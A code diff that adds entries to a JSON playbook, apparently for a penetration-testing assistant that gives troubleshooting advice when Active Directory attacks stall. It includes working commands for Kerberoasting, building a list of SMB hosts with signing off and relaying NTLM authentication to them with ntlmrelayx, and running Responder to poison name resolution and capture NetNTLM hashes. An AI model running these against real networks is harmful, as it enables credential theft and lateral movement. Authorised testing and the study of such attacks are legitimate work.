@@ -2140,6 +2140,127 @@
       ]
     },
     {
+      "id": "kerberos-spn-fix",
+      "title": "Kerberos 'Principal Unknown' — Fix the Name/SPN",
+      "tool": "sh",
+      "tools": [
+        "sh"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [
+        "blocker.kerberos_spn"
+      ],
+      "produces": [
+        "advice.kerberos"
+      ],
+      "priority": 84,
+      "hypothesis": "KDC_ERR_S/C_PRINCIPAL_UNKNOWN is a naming mistake, not a wall: Kerberos is case- and name-sensitive and will not take an IP. You pointed at an IP instead of the FQDN, used the wrong SPN, or mis-cased the realm. Use the full DC/service name (in /etc/hosts), the exact SPN, and an UPPERCASE realm, and the ticket issues.",
+      "proves": "nothing attack-wise; it gets the KDC to recognise the principal so your Kerberos request works",
+      "does_not_prove": "that the account/SPN exists at all — if it truly does not, enumerate SPNs again",
+      "report": {
+        "finding": "Kerberos principal/SPN naming corrected",
+        "severity": "info"
+      },
+      "refs": [
+        "https://www.thehacker.recipes/ad/movement/kerberos"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "echo '{{target}} {{dc_fqdn}} {{domain}}' | sudo tee -a /etc/hosts; getent hosts {{dc_fqdn}}",
+          "note": "Kerberos needs the NAME, never the IP. Put the DC FQDN in /etc/hosts and address it by name (e.g. dc01.corp.local, realm in CAPS as CORP.LOCAL)."
+        },
+        {
+          "tool": "sh",
+          "run": "nxc ldap {{dc_fqdn}} -u {{user}} -p {{password}} --kerberoasting out.txt   # confirm the SPN exists",
+          "note": "S_PRINCIPAL_UNKNOWN on a service ticket = wrong/absent SPN. Re-list SPNs and copy the exact value. C_PRINCIPAL_UNKNOWN = the USER/realm is wrong (check spelling and realm case)."
+        }
+      ]
+    },
+    {
+      "id": "relay-target-signing",
+      "title": "Relay Blocked by SMB Signing — Pick a Signing-Off Target",
+      "tool": "nxc",
+      "tools": [
+        "nxc",
+        "ntlmrelayx"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [
+        "blocker.smb_signing"
+      ],
+      "produces": [
+        "advice.relay"
+      ],
+      "priority": 82,
+      "hypothesis": "'Signing is required' means THIS relay target enforces SMB signing, so a relayed session is rejected — but signing is per-host, and in most domains plenty of hosts have it OFF. Enumerate which, and relay to one of those instead. The attack is not dead; you aimed it at a hardened box.",
+      "proves": "nothing attack-wise; it redirects the relay to a host where it will actually land",
+      "does_not_prove": "that any host has signing off — if the whole domain enforces it, relay is genuinely out",
+      "report": {
+        "finding": "Relay target selection (SMB signing)",
+        "severity": "info"
+      },
+      "refs": [
+        "https://www.thehacker.recipes/ad/movement/ntlm/relay"
+      ],
+      "commands": [
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{subnet}} --gen-relay-list relay_targets.txt",
+          "note": "Sweep the subnet and write every host with SMB signing OFF to a file — those are the only valid relay targets."
+        },
+        {
+          "tool": "ntlmrelayx",
+          "run": "impacket-ntlmrelayx -tf relay_targets.txt -smb2support",
+          "note": "Point the relay at that target list, not the signing-required host. Now the coerced/poisoned auth relays successfully."
+        }
+      ]
+    },
+    {
+      "id": "responder-tune",
+      "title": "Responder Catching Nothing — Turn Its Servers On",
+      "tool": "sh",
+      "tools": [
+        "sh"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [
+        "blocker.responder_quiet"
+      ],
+      "produces": [
+        "advice.responder"
+      ],
+      "priority": 60,
+      "hypothesis": "Responder is poisoning but no hashes arrive because the rogue server that captures them is OFF — its SMB/HTTP is disabled in Responder.conf, or your own smbd/Apache is squatting the port. Turn the capture servers on (and free the ports) and the NetNTLM hashes start landing.",
+      "proves": "nothing attack-wise; it makes Responder actually capture the auth it poisons",
+      "does_not_prove": "that any victim will authenticate — you still need traffic (a coerce, a logon, a mistyped share)",
+      "report": {
+        "finding": "Responder capture servers re-enabled",
+        "severity": "info"
+      },
+      "refs": [
+        "https://github.com/lgandx/Responder"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "sudo ss -tlnp | grep -E ':445|:80 '; grep -E 'SMB|HTTP' /etc/responder/Responder.conf",
+          "note": "Check nothing else holds 445/80 (stop a running smbd/apache2) and that SMB=On, HTTP=On in Responder.conf."
+        },
+        {
+          "tool": "sh",
+          "run": "sudo responder -I {{iface}} -wv",
+          "note": "Run with the capture servers on (-w enables WPAD). Hashes now land as victims authenticate; feed them to crack-identify."
+        }
+      ]
+    },
+    {
       "id": "fix-clock-skew",
       "title": "Kerberos Clock Skew — Sync and Retry",
       "hypothesis": "KRB_AP_ERR_SKEW / \"clock skew too great\" is not a broken credential — Kerberos simply refuses tickets when your clock and the DC's differ by more than ~5 minutes. Sync your box to the DC and the exact same command works. This one error strands more people in AD than any real defence does.",
